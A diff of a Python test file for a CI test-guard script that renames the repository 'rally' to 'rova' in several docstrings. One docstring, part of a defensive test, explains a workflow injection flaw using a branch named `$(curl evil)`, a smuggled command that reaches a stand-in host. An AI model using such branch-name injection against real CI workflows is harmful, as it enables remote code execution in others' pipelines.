@@ -1,7 +1,7 @@
 """The agent-forge test-guard, the check that runs in a product repository's CI.
 
 Tested here because this is where the script now lives. It arrived with these tests rather than
-without them: the guard is a REQUIRED check on rally's main branch, and a required check nobody
+without them: the guard is a REQUIRED check on rova's main branch, and a required check nobody
 tests is a decoration that blocks merges.
 
 Loaded by path rather than imported. The script ships as a standalone file and runs in repositories
@@ -224,7 +224,7 @@ def test_the_guard_needs_no_third_party_import() -> None:
 
 
 def test_a_release_bump_is_not_a_new_dependency(repo: pathlib.Path) -> None:
-    """rally's release pull requests failed this check, every single one.
+    """rova's release pull requests failed this check, every single one.
 
     #494 `chore(release): 0.7.7` touched `package.json`, `CHANGELOG.md` and
     `.release-please-manifest.json`, and was told to declare a dependency it had not added, because
@@ -297,7 +297,7 @@ def test_the_action_does_not_interpolate_a_branch_name_into_a_shell() -> None:
     """The copied version shipped the vulnerable form for months, and that is why this is shared.
 
     A branch name is attacker-controlled on a fork pull request, and `${{ }}` expands before the
-    shell sees it — so a branch called `$(curl evil)` would execute. rally's copy was fixed when
+    shell sees it — so a branch called `$(curl evil)` would execute. rova's copy was fixed when
     zizmor flagged it (#495) and the fix never came back to the canonical template, so every
     repository onboarded after that point would have taken the vulnerable version. Drift with the
     consumer AHEAD of the source is the direction nobody watches for, and one copy is the only real
@@ -335,7 +335,7 @@ def test_the_reusable_workflows_job_is_named_test_guard() -> None:
 
     GitHub names a reusable workflow's check `<caller job>/<called job>`, so this one reports as
     `test-guard / test-guard` — NOT `test-guard`. A repository that already requires `test-guard`
-    (rally does) must call the composite action instead, which keeps the job local and the name
+    (rova does) must call the composite action instead, which keeps the job local and the name
     intact. Getting that backwards does not produce a failing check; it produces a required check
     that never reports, which blocks every merge indefinitely.
 
